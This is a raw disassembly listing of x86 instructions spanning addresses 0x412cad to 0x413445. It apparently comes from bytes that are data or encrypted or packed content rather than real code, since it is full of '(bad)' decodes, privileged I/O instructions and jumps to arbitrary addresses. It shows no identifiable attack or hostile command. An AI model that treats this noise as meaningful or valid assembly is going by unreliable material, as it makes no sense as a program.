  412cad:	outs   dx,BYTE PTR ds:[esi]
  412cae:	ja     0x412cc3
  412cb0:	arpl   WORD PTR [ebx-0x5758c837],ax
  412cb6:	adc    DWORD PTR [ebp-0x2b7d72b8],eax
  412cbc:	hlt    
  412cbd:	push   0xffffffea
  412cbf:	out    dx,eax
  412cc0:	or     bl,BYTE PTR [ebp+0xc422d76]
  412cc6:	shr    BYTE PTR [eax+0x2fa7dd60],1
  412ccc:	mov    ah,0x2a
  412cce:	sub    ch,cl
  412cd0:	mov    dh,0x70
  412cd2:	add    eax,0x185d8cdc
  412cd7:	mov    WORD PTR [eax-0x13424b2c],fs
  412cdd:	sub    ah,bh
  412cdf:	dec    esi
  412ce0:	into   
  412ce1:	outs   dx,BYTE PTR ds:[esi]
  412ce2:	pop    ecx
  412ce3:	leave  
  412ce4:	mov    ds:0xe565f962,eax
  412ce9:	sti    
  412cea:	ss inc esi
  412cec:	retf   0x6a42
  412cef:	ror    eax,1
  412cf1:	xchg   ebx,eax
  412cf2:	pusha  
  412cf3:	xchg   ebp,eax
  412cf4:	test   DWORD PTR [ecx+ebp*1+0x3c],esi
  412cf8:	xor    al,bh
  412cfa:	mov    esp,0x79782d0f
  412cff:	xchg   DWORD PTR [ebx-0x7f53bc77],edx
  412d05:	in     eax,dx
  412d06:	and    dl,BYTE PTR [edx-0x4a227472]
  412d0c:	mov    ebx,0x2dce35e
  412d11:	ficomp DWORD PTR [edx+edx*1]
  412d14:	push   es
  412d15:	loop   0x412d4a
  412d17:	in     eax,0x32
  412d19:	pop    es
  412d1a:	sbb    eax,DWORD PTR [eax-0x3b1af696]
  412d20:	out    0x63,eax
  412d22:	xchg   esp,eax
  412d23:	cmp    ebx,DWORD PTR [ebx+0x460dbacf]
  412d29:	add    DWORD PTR [esi],edi
  412d2b:	loope  0x412d81
  412d2d:	dec    esp
  412d2e:	sub    eax,DWORD PTR [esi+0x25]
  412d31:	inc    eax
  412d32:	nop
  412d33:	cld    
  412d34:	out    0x3d,eax
  412d36:	sub    al,0x3b
  412d38:	mov    ecx,0x4aee4e2c
  412d3d:	add    bh,BYTE PTR [ebx+0x76]
  412d40:	adc    al,BYTE PTR [edi]
  412d42:	inc    edi
  412d43:	mov    esi,0x70d6ab32
  412d48:	fmul   st(6),st
  412d4a:	push   edi
  412d4b:	and    al,bh
  412d4d:	in     eax,dx
  412d4e:	mov    al,ds:0xbc52a045
  412d53:	mov    ebx,0x37163fdf
  412d58:	(bad)  
  412d59:	mov    al,0x84
  412d5b:	sbb    al,0x4e
  412d5d:	mov    ebx,0x6bb3d82a
  412d62:	jo     0x412dc7
  412d64:	aam    0x2e
  412d66:	aas    
  412d67:	pop    edx
  412d68:	dec    edi
  412d69:	fisttp QWORD PTR [edx]
  412d6b:	fsub   QWORD PTR [edi+0x35]
  412d6e:	push   eax
  412d6f:	sbb    BYTE PTR [ebp+0x31],0x6
  412d73:	addr16 in al,0x7c
  412d76:	retf   0x978b
  412d79:	add    DWORD PTR [ecx-0x76],eax
  412d7c:	rol    DWORD PTR [ebx-0x339de836],0xfd
  412d83:	cmp    BYTE PTR [esi+0x62],0x47
  412d87:	xchg   ebx,eax
  412d88:	sbb    bh,cl
  412d8a:	bound  edx,QWORD PTR [edx+0x23]
  412d8d:	inc    ecx
  412d8e:	in     al,0x9e
  412d90:	ds jmp 0xd67fa8eb
  412d96:	push   cs
  412d97:	inc    esi
  412d98:	mov    eax,0x86de1bb7
  412d9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d9e:	push   edx
  412d9f:	(bad)  
  412da0:	daa    
  412da1:	lods   eax,DWORD PTR ds:[esi]
  412da2:	mov    ecx,0xbe575c74
  412da7:	jecxz  0x412dd1
  412da9:	fist   WORD PTR [ebp+ebp*1+0x7f]
  412dad:	ret    0x58b9
  412db0:	(bad)  
  412db1:	mov    ds:0x4a4f0cc7,al
  412db6:	popf   
  412db7:	gs jle 0x412e10
  412dba:	mov    ds:0x7f61e07a,al
  412dbf:	test   al,0x6a
  412dc1:	inc    eax
  412dc2:	hlt    
  412dc3:	fidiv  DWORD PTR [ebx+0x3cd46bdf]
  412dc9:	pop    esp
  412dca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dcb:	ds jns 0x412d71
  412dce:	mov    ecx,0xf2499732
  412dd3:	call   0x3780f87a
  412dd8:	rol    edx,0xbd
  412ddb:	xchg   edx,eax
  412ddc:	jae    0x412e5c
  412dde:	or     eax,0x3d8a2f64
  412de3:	xchg   esi,eax
  412de4:	xchg   esp,eax
  412de5:	fild   QWORD PTR ds:0xa4e3a796
  412deb:	dec    eax
  412dec:	mov    ah,0x92
  412dee:	sub    cl,dh
  412df0:	je     0x412e5e
  412df2:	pop    esp
  412df3:	inc    BYTE PTR [ebx+0x192f6d64]
  412df9:	in     eax,dx
  412dfa:	xor    al,0x50
  412dfc:	shl    BYTE PTR [ecx+ecx*2],1
  412dff:	lods   al,BYTE PTR ds:[esi]
  412e00:	scas   al,BYTE PTR es:[edi]
  412e01:	jb     0x412df4
  412e03:	sub    DWORD PTR [edi+eiz*4-0x8b0d97b],0xffffff97
  412e0b:	dec    ecx
  412e0c:	fxch   st(0)
  412e0e:	sbb    DWORD PTR [ecx],ebx
  412e10:	adc    eax,0x17f2989
  412e15:	dec    edi
  412e16:	mov    DWORD PTR [esi],0x4101f18e
  412e1c:	cwde   
  412e1d:	and    ebx,ebx
  412e1f:	add    al,cl
  412e21:	leave  
  412e22:	mov    cl,0x9c
  412e24:	gs ins DWORD PTR es:[edi],dx
  412e26:	imul   edi,DWORD PTR [edx+0xf66e5bd],0x0
  412e2d:	out    0xc6,al
  412e2f:	lods   al,BYTE PTR ds:[esi]
  412e30:	int3   
  412e31:	lods   al,BYTE PTR ds:[esi]
  412e32:	mov    DWORD PTR [edx-0x4e],0x57b00d76
  412e39:	fsubr  DWORD PTR [eax+ebp*1+0x38]
  412e3d:	stos   DWORD PTR es:[edi],eax
  412e3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e3f:	psrlw  mm1,QWORD PTR [ecx+0x20db26b2]
  412e46:	mov    DWORD PTR [edi+0xc],edi
  412e49:	nop
  412e4a:	adc    ah,BYTE PTR [edi+eiz*8]
  412e4d:	adc    dh,bh
  412e4f:	cmp    al,0x1d
  412e51:	add    eax,0xdca84d0d
  412e56:	imul   esi,DWORD PTR [edx+0x141b93cd],0x24
  412e5d:	mov    eax,ds:0xfa672a53
  412e62:	call   DWORD PTR [ebx-0x64]
  412e65:	loop   0x412e21
  412e67:	xchg   esp,eax
  412e68:	and    al,0x5
  412e6a:	les    eax,FWORD PTR [ebp-0x13]
  412e6d:	and    dl,BYTE PTR [ecx+0x1d38039f]
  412e73:	sub    DWORD PTR ds:0xf9ecd236,ebp
  412e79:	push   esp
  412e7a:	ins    BYTE PTR es:[di],dx
  412e7c:	arpl   WORD PTR [ebx+0x25],si
  412e7f:	mov    ah,0x3b
  412e81:	cwde   
  412e82:	sbb    al,0xa9
  412e84:	ins    BYTE PTR es:[edi],dx
  412e85:	test   ebp,edx
  412e87:	push   cs
  412e88:	outs   dx,DWORD PTR ds:[esi]
  412e89:	out    0x6a,eax
  412e8b:	jmp    0x412eb5
  412e8d:	push   edi
  412e8e:	fs xchg ebx,eax
  412e90:	or     eax,DWORD PTR [ecx+0x699de88]
  412e96:	loopne 0x412f0f
  412e98:	push   eax
  412e99:	xor    al,0x5e
  412e9b:	xlat   BYTE PTR ds:[ebx]
  412e9c:	inc    esp
  412e9d:	push   ds
  412e9e:	fstp   DWORD PTR [edx-0x24]
  412ea1:	dec    ebp
  412ea2:	or     bl,ch
  412ea4:	addr16 sbb eax,0xeb166716
  412eaa:	cwde   
  412eab:	sbb    edi,DWORD PTR [ebx-0x7123e7ed]
  412eb1:	lods   eax,DWORD PTR ds:[esi]
  412eb2:	pop    ebx
  412eb3:	daa    
  412eb4:	sti    
  412eb5:	adc    eax,0x85d944b4
  412eba:	xor    esi,DWORD PTR [ecx-0x54]
  412ebd:	(bad)  
  412ebe:	dec    ecx
  412ebf:	shr    DWORD PTR [ecx],1
  412ec1:	xor    dx,WORD PTR [eax]
  412ec4:	xchg   BYTE PTR [eax+0x121849b5],bl
  412eca:	(bad)  
  412ecc:	into   
  412ecd:	xor    DWORD PTR [ecx],edx
  412ecf:	mov    DWORD PTR [ecx],ecx
  412ed1:	sub    al,0x74
  412ed3:	fst    QWORD PTR [esi+0x6963eb53]
  412ed9:	jmp    0x412f26
  412edb:	(bad)  
  412edd:	ja     0x412ede
  412edf:	fistp  QWORD PTR [ecx-0x4caa1d53]
  412ee5:	cs sub ecx,edx
  412ee8:	lahf   
  412ee9:	ss push ebp
  412eeb:	faddp  st(4),st
  412eed:	inc    eax
  412eee:	lds    edx,FWORD PTR [edi]
  412ef0:	cdq    
  412ef1:	sub    DWORD PTR [ebp+ebx*2-0x25],ebx
  412ef5:	or     ebx,ecx
  412ef7:	out    0xda,eax
  412ef9:	daa    
  412efa:	cwde   
  412efb:	iret   
  412efc:	inc    ebp
  412efd:	adc    ecx,DWORD PTR [eax]
  412eff:	(bad)  
  412f00:	push   esp
  412f01:	dec    edx
  412f02:	xlat   BYTE PTR ds:[ebx]
  412f03:	dec    DWORD PTR [ebp-0x26]
  412f06:	sbb    ebp,DWORD PTR [ecx-0x73]
  412f09:	push   ecx
  412f0a:	out    0xda,al
  412f0c:	dec    ebx
  412f0d:	ficomp DWORD PTR [esi]
  412f0f:	xchg   esi,eax
  412f10:	xchg   DWORD PTR [esi],esi
  412f12:	cmp    eax,DWORD PTR [eax]
  412f14:	test   DWORD PTR [esi+0x61397755],edx
  412f1a:	rol    DWORD PTR [edi-0x10],cl
  412f1d:	das    
  412f1e:	ret    
  412f1f:	mov    cl,0xd2
  412f21:	or     esi,DWORD PTR [ecx-0x6ca9dc0c]
  412f27:	hlt    
  412f28:	(bad)  
  412f29:	arpl   WORD PTR [ecx-0x51],bp
  412f2c:	xlat   BYTE PTR ds:[ebx]
  412f2d:	nop
  412f2e:	or     al,0x19
  412f30:	mov    cl,0xf3
  412f32:	repnz mov bl,0xd8
  412f35:	adc    esi,0xfffffffa
  412f38:	test   BYTE PTR [edx-0x3b],dh
  412f3b:	push   ecx
  412f3c:	shl    ebp,0x11
  412f3f:	xchg   DWORD PTR ds:0x91d6ecaf,ecx
  412f45:	dec    ebp
  412f46:	push   ebx
  412f47:	mov    ah,0x93
  412f49:	mov    BYTE PTR [eax],cl
  412f4b:	push   0x18735d90
  412f50:	mov    esi,0x4f383521
  412f55:	or     edi,DWORD PTR [ecx+0x18c1694]
  412f5b:	lods   eax,DWORD PTR ds:[esi]
  412f5c:	jne    0x412f1c
  412f5e:	(bad)  
  412f5f:	jbe    0x412f71
  412f61:	jae    0x412f28
  412f63:	stos   BYTE PTR es:[edi],al
  412f64:	loope  0x412fd9
  412f66:	in     al,0x22
  412f68:	mov    eax,0x86f6ecc5
  412f6d:	or     al,0x74
  412f6f:	xor    edi,DWORD PTR [edx*1-0x2a679801]
  412f76:	fsubrp st(4),st
  412f78:	scas   eax,DWORD PTR es:[edi]
  412f79:	fidiv  WORD PTR [edx]
  412f7b:	adc    eax,0x1bc42624
  412f80:	or     eax,0x14c4ef8e
  412f85:	inc    edi
  412f86:	xchg   ebx,eax
  412f87:	std    
  412f88:	and    eax,0xf8f85565
  412f8d:	inc    ebp
  412f8e:	and    ah,al
  412f90:	pushf  
  412f91:	lock iret 
  412f93:	stc    
  412f94:	cwde   
  412f95:	ror    dl,0xff
  412f98:	push   0xffffffd8
  412f9a:	in     al,dx
  412f9b:	call   0x33f5c56a
  412fa0:	rol    bl,0x32
  412fa3:	stos   DWORD PTR es:[edi],eax
  412fa4:	add    eax,0x87668e5b
  412fa9:	out    0x4e,al
  412fab:	push   0x6534c516
  412fb0:	add    ebp,DWORD PTR [esi-0x36]
  412fb3:	xor    ecx,DWORD PTR [ebx-0xda7e4e]
  412fb9:	mov    dl,0x3b
  412fbb:	add    edx,ecx
  412fbd:	xchg   ebp,eax
  412fbe:	mov    ebp,0x60bd76b2
  412fc3:	call   0xd15df73
  412fc8:	popf   
  412fc9:	pop    es
  412fca:	mov    BYTE PTR [eax-0x15],dh
  412fcd:	cmc    
  412fce:	push   cs
  412fcf:	adc    edx,DWORD PTR [eax]
  412fd1:	push   0x4c
  412fd3:	lods   eax,DWORD PTR ds:[esi]
  412fd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fd5:	jp     0x412fe7
  412fd7:	xchg   bl,ch
  412fd9:	int    0xca
  412fdb:	mov    esp,0x8a64c6b8
  412fe0:	push   ebx
  412fe1:	je     0x412fc8
  412fe3:	std    
  412fe4:	inc    ecx
  412fe5:	std    
  412fe6:	jmp    0x736fd65e
  412feb:	inc    esp
  412fec:	jmp    0x412fd2
  412fee:	sub    ebx,DWORD PTR [eax+0x6a]
  412ff1:	mov    esi,0xb4fefb76
  412ff6:	push   cs
  412ff7:	mov    al,ds:0x60b59c8d
  412ffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ffd:	and    eax,0xe651a447
  413002:	mov    ebp,0xd773d970
  413007:	mov    dl,0x9
  413009:	arpl   ax,cx
  41300b:	clc    
  41300c:	xchg   ebp,eax
  41300d:	xchg   ebx,eax
  41300e:	lods   eax,DWORD PTR ds:[esi]
  41300f:	sbb    al,0xf4
  413011:	aas    
  413012:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413013:	xlat   BYTE PTR ds:[ebx]
  413014:	pop    es
  413015:	mul    bl
  413017:	inc    esi
  413018:	out    dx,al
  413019:	mov    edx,0x94d8bf35
  41301f:	xchg   ebp,eax
  413020:	and    al,0xfb
  413022:	fdivr  QWORD PTR [edx+0x7e]
  413025:	mov    eax,0x9c10a5dd
  41302a:	xchg   DWORD PTR [ebx],ecx
  41302c:	mov    ebx,eax
  41302e:	dec    edx
  41302f:	pop    es
  413030:	lahf   
  413031:	xchg   DWORD PTR [ebp+0x1a],esi
  413034:	adc    al,0xaa
  413036:	mov    cl,0xc3
  413038:	and    al,0x4a
  41303a:	out    0xa9,al
  41303c:	cmp    ch,BYTE PTR [eax]
  41303e:	mov    bp,0xd89d
  413042:	push   ss
  413043:	sub    ah,0xb0
  413046:	shr    bh,0x1e
  413049:	xlat   BYTE PTR ds:[ebx]
  41304a:	call   0x9f7a33b
  41304f:	outs   dx,DWORD PTR ds:[esi]
  413050:	xor    eax,0xcb470cfc
  413055:	jp     0x41306a
  413057:	and    dl,BYTE PTR [ebx]
  413059:	mov    ebx,ebp
  41305b:	dec    ecx
  41305c:	cli    
  41305d:	shl    ch,1
  41305f:	sub    al,0x54
  413061:	inc    esi
  413062:	scas   eax,DWORD PTR es:[edi]
  413063:	adc    al,0x46
  413065:	aam    0x7a
  413067:	mov    BYTE PTR [edi+edi*4],dl
  41306a:	dec    eax
  41306b:	fwait
  41306c:	pop    ebp
  41306d:	(bad)  
  41306e:	fstp   QWORD PTR [edx+0x2245aa03]
  413074:	dec    edx
  413075:	xlat   BYTE PTR ds:[ebx]
  413076:	(bad)  
  413077:	pop    esi
  413078:	or     al,BYTE PTR [ebx+0x4b]
  41307b:	out    0xc3,eax
  41307d:	jno    0x41302a
  41307f:	cdq    
  413080:	adc    ebx,DWORD PTR [esi-0x33]
  413083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413084:	out    dx,al
  413085:	inc    esi
  413086:	add    eax,DWORD PTR [eax+edi*1+0x7944464b]
  41308d:	pop    ecx
  41308e:	lea    ecx,[esi+0x28b42489]
  413094:	aam    0x21
  413096:	inc    ecx
  413097:	add    ah,BYTE PTR [ecx+0x49]
  41309a:	lods   al,BYTE PTR ds:[esi]
  41309b:	(bad)  
  41309c:	ficomp DWORD PTR [edx]
  41309e:	(bad)  
  41309f:	adc    bh,0x42
  4130a2:	jmp    0x3302:0x74826695
  4130a9:	jecxz  0x4130ba
  4130ab:	out    dx,al
  4130ac:	stc    
  4130ad:	xor    esi,DWORD PTR ds:0xbe9bb65d
  4130b3:	pop    ebx
  4130b4:	into   
  4130b5:	pop    ebx
  4130b6:	or     al,0x8d
  4130b8:	lods   al,BYTE PTR ds:[esi]
  4130b9:	js     0x413056
  4130bb:	adc    al,0xe1
  4130bd:	push   edi
  4130be:	scas   eax,DWORD PTR es:[edi]
  4130bf:	out    0x40,al
  4130c1:	add    BYTE PTR [edi-0x2fd3529b],bh
  4130c7:	sti    
  4130c8:	dec    ebx
  4130c9:	dec    edx
  4130ca:	xor    eax,0x67b34c62
  4130cf:	add    BYTE PTR [edi-0x58],bh
  4130d2:	push   ebp
  4130d3:	not    DWORD PTR [ecx+0x46]
  4130d6:	(bad)  
  4130d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130d8:	pop    ecx
  4130d9:	jnp    0x4130ce
  4130db:	leave  
  4130dc:	(bad)  
  4130dd:	push   cs
  4130de:	aad    0xe0
  4130e0:	fs adc al,0xdc
  4130e3:	and    edx,ecx
  4130e5:	sbb    al,0x95
  4130e7:	clc    
  4130e8:	inc    ebp
  4130e9:	call   0x96e3fae9
  4130ee:	adc    DWORD PTR [ebx+0x46],0x89cfa9f0
  4130f5:	or     cl,bl
  4130f7:	adc    bh,al
  4130f9:	fmul   QWORD PTR [esi-0x74a3c0eb]
  4130ff:	lods   al,BYTE PTR ds:[esi]
  413100:	jle    0x413164
  413102:	ror    cl,1
  413104:	mov    eax,0x57a9d456
  413109:	or     eax,DWORD PTR [ecx+edx*4+0x2d7d7f8e]
  413110:	mov    ds:0x704a6542,al
  413115:	jecxz  0x41317d
  413117:	ficom  WORD PTR [ebp-0x4]
  41311a:	lods   al,BYTE PTR ds:[esi]
  41311b:	xlat   BYTE PTR ds:[ebx]
  41311c:	xor    eax,0xae5aa840
  413121:	ret    0x44f4
  413124:	outs   dx,BYTE PTR ds:[esi]
  413125:	nop
  413126:	retf   
  413127:	mov    al,0x9
  413129:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41312a:	or     BYTE PTR [esi+0x5d7bc93b],0xdd
  413131:	loope  0x413101
  413133:	xor    al,0xd0
  413135:	ds jb  0x413112
  413138:	sbb    bl,0x1
  41313b:	rol    DWORD PTR [ecx+0x7e],1
  41313e:	mov    ds:0xda1d9f91,eax
  413143:	or     al,0xb5
  413145:	in     al,0x61
  413147:	cmp    edx,DWORD PTR [edx]
  413149:	loope  0x413116
  41314b:	fmul   QWORD PTR [esi+edi*4-0x6c3c7a27]
  413152:	add    DWORD PTR [ebp+0x20651e7e],esi
  413158:	xor    eax,0x386f6056
  41315d:	scas   eax,DWORD PTR es:[edi]
  41315e:	fst    DWORD PTR [ebp-0x6408f0b4]
  413164:	dec    esi
  413165:	xor    DWORD PTR [edx-0x649e1525],ebx
  41316b:	push   eax
  41316c:	stos   DWORD PTR es:[edi],eax
  41316d:	daa    
  41316e:	pop    ds
  41316f:	pop    ds
  413170:	xchg   esi,eax
  413171:	call   0xfa9f:0x5448bbf
  413178:	cmc    
  413179:	call   0x9a70c2b1
  41317e:	mov    ebx,DWORD PTR [bx+di+0x5]
  413182:	jno    0x4131f1
  413184:	sti    
  413185:	out    dx,al
  413186:	push   eax
  413187:	mov    WORD PTR [esi-0x1bfc09b7],?
  41318d:	aaa    
  41318e:	imul   esp,DWORD PTR [edx],0x42
  413191:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413192:	arpl   WORD PTR [ecx+eiz*4-0x36],cx
  413196:	cwde   
  413197:	cmp    al,ah
  413199:	adc    dl,BYTE PTR [ebx+ecx*4]
  41319c:	mov    es,WORD PTR [ebp+0x1ae48c03]
  4131a2:	mov    eax,0x760f0b02
  4131a7:	sbb    DWORD PTR [esi-0x24e53dd7],esp
  4131ad:	aad    0x3b
  4131af:	repz or dh,BYTE PTR [esi-0x68cbb4fb]
  4131b6:	xchg   edx,eax
  4131b7:	pop    ebx
  4131b8:	push   esi
  4131b9:	fmul   DWORD PTR [edx+eax*8]
  4131bc:	cmp    bl,BYTE PTR [ecx-0x5c]
  4131bf:	sbb    al,ah
  4131c1:	(bad)  
  4131c2:	rol    BYTE PTR [edi+0xb],1
  4131c5:	push   0xf1c2603b
  4131ca:	jle    0x4131aa
  4131cc:	xchg   ebp,eax
  4131cd:	sar    DWORD PTR [eax-0x4e20b139],cl
  4131d3:	and    edx,ecx
  4131d5:	xor    ecx,edx
  4131d7:	jne    0x413170
  4131d9:	daa    
  4131da:	pop    es
  4131db:	sub    eax,0xc982b9f8
  4131e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131e1:	sbb    edi,DWORD PTR [ebp+eax*1-0x1a472e66]
  4131e8:	or     DWORD PTR [edx+0x37b68afe],0x44
  4131ef:	pop    es
  4131f0:	mov    ss,WORD PTR [esi]
  4131f2:	sbb    bl,BYTE PTR [esi+0x14]
  4131f5:	rcl    BYTE PTR [esi+esi*8+0x5077e9c0],1
  4131fc:	mov    eax,0x4d607e52
  413201:	or     DWORD PTR [ebx+0x16],eax
  413204:	popf   
  413205:	pop    ebp
  413206:	pushf  
  413207:	jp     0x41319c
  413209:	sahf   
  41320a:	sti    
  41320b:	push   ebp
  41320c:	mov    ecx,0x116fdf7c
  413211:	sahf   
  413212:	xchg   ecx,eax
  413213:	call   0x624be19e
  413218:	retf   0xca8f
  41321b:	xchg   ebp,ebp
  41321d:	and    bl,BYTE PTR [esi-0x3cf5c4c4]
  413223:	adc    ecx,DWORD PTR [edx+eax*8]
  413226:	popf   
  413227:	pop    ecx
  413228:	(bad)  
  413229:	jne    0x41329a
  41322b:	inc    esp
  41322c:	xchg   esi,eax
  41322d:	(bad)  
  41322f:	mov    al,ds:0x85e834c4
  413234:	fcomp  DWORD PTR [eax]
  413236:	int3   
  413237:	ins    BYTE PTR es:[edi],dx
  413238:	inc    esi
  413239:	ret    0x177b
  41323c:	outs   dx,DWORD PTR ds:[esi]
  41323d:	rcr    BYTE PTR [edx+0x7e],0xc0
  413241:	xor    al,0x90
  413243:	test   dh,cl
  413245:	xchg   esi,eax
  413246:	sub    eax,edx
  413248:	add    eax,0x412c71a8
  41324d:	push   edi
  41324e:	cmp    eax,ecx
  413250:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413251:	pop    ecx
  413252:	scas   al,BYTE PTR es:[edi]
  413253:	xor    ebx,DWORD PTR [ecx-0x673ee516]
  413259:	dec    eax
  41325a:	and    al,0x6
  41325c:	jecxz  0x41329b
  41325e:	fwait
  41325f:	(bad)
  413262:	nop
  413263:	push   ecx
  413264:	sub    DWORD PTR [ebp+0x34],eax
  413267:	add    DWORD PTR [edi+0x1c],ecx
  41326a:	xchg   ecx,eax
  41326b:	mov    edx,0x7a18848f
  413270:	cmp    DWORD PTR ds:0xc2944b5,edx
  413276:	sub    esp,DWORD PTR [edi+0x1]
  413279:	cmp    BYTE PTR [ebp+0x2a83a846],bh
  41327f:	das    
  413280:	nop
  413281:	and    bh,BYTE PTR [esi]
  413283:	pop    ecx
  413284:	pusha  
  413285:	addr16 dec esi
  413287:	xor    eax,0xe12fe512
  41328c:	inc    esp
  41328d:	in     al,0x73
  41328f:	daa    
  413290:	sti    
  413291:	test   al,0x3
  413293:	mov    al,ds:0xe93c6cbc
  413298:	and    DWORD PTR [ebx+0x773b9fdb],edi
  41329e:	xor    BYTE PTR [esi],dl
  4132a0:	mov    eax,0x297380e0
  4132a5:	scas   al,BYTE PTR es:[edi]
  4132a6:	iret   
  4132a7:	or     al,0x59
  4132a9:	push   edi
  4132aa:	out    dx,eax
  4132ab:	ja     0x413256
  4132ad:	out    0xe6,eax
  4132af:	xor    bl,BYTE PTR [edi]
  4132b1:	mov    edx,DWORD PTR [ebx]
  4132b3:	xor    al,bh
  4132b5:	adc    al,BYTE PTR [ebp-0x29]
  4132b8:	call   0x3579:0x8e6234a7
  4132bf:	xchg   BYTE PTR [eax],dl
  4132c1:	push   esi
  4132c2:	sti    
  4132c3:	inc    ebx
  4132c4:	xchg   ebx,eax
  4132c5:	das    
  4132c6:	sub    ecx,DWORD PTR [ecx+0x77d7c542]
  4132cc:	pop    edx
  4132cd:	ins    DWORD PTR es:[edi],dx
  4132ce:	fld1   
  4132d0:	jecxz  0x4132a8
  4132d2:	les    ebp,FWORD PTR [eax*8+0x396a20d7]
  4132d9:	xor    eax,0x36315b6
  4132de:	jae    0x41327e
  4132e0:	add    esp,DWORD PTR [edi+0x7a]
  4132e3:	ror    BYTE PTR [esi],cl
  4132e5:	sahf   
  4132e6:	rcl    ebp,cl
  4132e8:	fidivr WORD PTR [ecx+0x69]
  4132eb:	les    eax,FWORD PTR [eax-0x58]
  4132ee:	pop    ebx
  4132ef:	sbb    eax,0x94c088bd
  4132f4:	and    al,0x15
  4132f6:	xor    DWORD PTR [ecx],esi
  4132f8:	inc    edi
  4132f9:	sub    cl,BYTE PTR [ebp+0x4a]
  4132fc:	xchg   esp,eax
  4132fd:	rcr    dl,cl
  4132ff:	leave  
  413300:	adc    eax,0x83806f36
  413305:	fbld   TBYTE PTR [eax+0x41]
  413308:	sub    esi,DWORD PTR [esp+edi*2-0x578ca79]
  41330f:	inc    ebp
  413310:	(bad)  
  413311:	es clc 
  413313:	les    eax,FWORD PTR [ecx-0x3811512]
  413319:	add    eax,0x6a47d7ee
  41331e:	cmp    DWORD PTR [ebx],ebx
  413320:	jp     0x41333d
  413322:	sar    BYTE PTR [ecx],1
  413324:	into   
  413325:	retf   
  413326:	jmp    0x6590:0x7474fdfb
  41332d:	sbb    al,0x8c
  41332f:	push   ds
  413330:	push   ebx
  413331:	and    ecx,DWORD PTR [ecx]
  413333:	(bad)  
  413334:	lds    esp,FWORD PTR [eax]
  413336:	cmp    BYTE PTR [edi+0x6b],dl
  413339:	leave  
  41333a:	scas   eax,DWORD PTR es:[edi]
  41333b:	cmp    al,0x43
  41333d:	aam    0xd2
  41333f:	jo     0x413363
  413341:	mov    al,ds:0x5e529b86
  413346:	imul   BYTE PTR [edi]
  413348:	imul   ebx,DWORD PTR [esi+0x5d],0x30
  41334c:	jne    0x413345
  41334e:	adc    al,0x99
  413350:	outs   dx,BYTE PTR ds:[esi]
  413351:	dec    eax
  413352:	test   DWORD PTR [ebp-0x69],0xcbec90cd
  413359:	add    bh,BYTE PTR [edi-0x448693ee]
  41335f:	push   ecx
  413360:	or     ebp,ecx
  413362:	pop    edx
  413363:	push   ds
  413364:	xor    DWORD PTR [eax],ecx
  413366:	and    DWORD PTR [ebx+0x46],edi
  413369:	jmp    0x413302
  41336b:	jo     0x413306
  41336d:	arpl   WORD PTR [eax+0x69],bp
  413370:	mov    ebx,gs
  413372:	sbb    edx,DWORD PTR [edx+0x43f3cdd5]
  413378:	enter  0x929e,0xf8
  41337c:	mov    eax,ds:0x8678c45f
  413381:	push   0x5c688c58
  413386:	arpl   WORD PTR [ebx-0x28baff8f],cx
  41338c:	mov    eax,0x869d8a69
  413391:	sbb    esi,DWORD PTR [ecx]
  413393:	outs   dx,DWORD PTR ds:[esi]
  413394:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413395:	mov    ds:0xc9b6311e,al
  41339a:	cmp    DWORD PTR [ecx-0x5984eff6],eax
  4133a0:	daa    
  4133a1:	push   cs
  4133a2:	shr    BYTE PTR ss:[ebx+0x31],cl
  4133a6:	xchg   edx,eax
  4133a7:	stc    
  4133a8:	mov    esi,0xd1c272fa
  4133ad:	and    BYTE PTR [ebp-0x50ece113],bh
  4133b3:	xor    BYTE PTR [ecx+0x78],dh
  4133b6:	sub    eax,esp
  4133b8:	cdq    
  4133b9:	fcmovnbe st,st(0)
  4133bb:	pop    ebp
  4133bc:	mov    esi,0xbfbc68c8
  4133c1:	sbb    al,0xeb
  4133c3:	aas    
  4133c4:	add    al,0xa8
  4133c6:	popf   
  4133c7:	xor    esp,edi
  4133c9:	pop    edi
  4133ca:	pop    edx
  4133cb:	outs   dx,BYTE PTR ds:[esi]
  4133cc:	mov    ebx,0x964ab016
  4133d1:	(bad)  
  4133d3:	xchg   ecx,eax
  4133d4:	mov    bl,0xc6
  4133d6:	jno    0x41335f
  4133d8:	inc    ecx
  4133d9:	sbb    DWORD PTR [ebx-0x364506c4],esi
  4133df:	sbb    al,0xea
  4133e1:	jne    0x4133ca
  4133e3:	push   0x1b
  4133e5:	push   ds
  4133e6:	call   0x1019c113
  4133eb:	mov    esp,0x7edc4589
  4133f0:	mov    al,ds:0x6dce26a0
  4133f5:	fdivrp st(7),st
  4133f7:	les    esi,FWORD PTR [eax]
  4133f9:	mov    ah,0x66
  4133fb:	ds xchg ebp,eax
  4133fd:	mov    ah,BYTE PTR [ebp+0x37]
  413400:	and    al,0x55
  413402:	gs fadd st(1),st
  413405:	pop    edi
  413406:	pop    ebp
  413407:	jmp    0x413394
  413409:	out    0xbc,eax
  41340b:	imul   eax,ebx,0x4a
  41340e:	(bad)
  413411:	sahf   
  413412:	push   esi
  413413:	inc    ebx
  413414:	fcomp  DWORD PTR [ebp-0x18795617]
  41341a:	add    ecx,DWORD PTR [esi-0x158f8049]
  413420:	dec    edi
  413421:	dec    edx
  413422:	addr16 ds jl 0x413491
  413426:	push   ds
  413427:	cmp    bl,bh
  413429:	lods   eax,DWORD PTR ds:[esi]
  41342a:	jne    0x4133fe
  41342c:	mov    es,WORD PTR [ebp-0x4bbc14f0]
  413432:	daa    
  413433:	jo     0x4133d7
  413435:	inc    ebp
  413436:	cli    
  413437:	sub    al,0xad
  413439:	(bad)  
  41343a:	jmp    0x4133f5
  41343c:	cmp    bh,BYTE PTR [edx+0x3a511a48]
  413442:	cmp    BYTE PTR [ecx+0x50],ch
  413445:	leave  
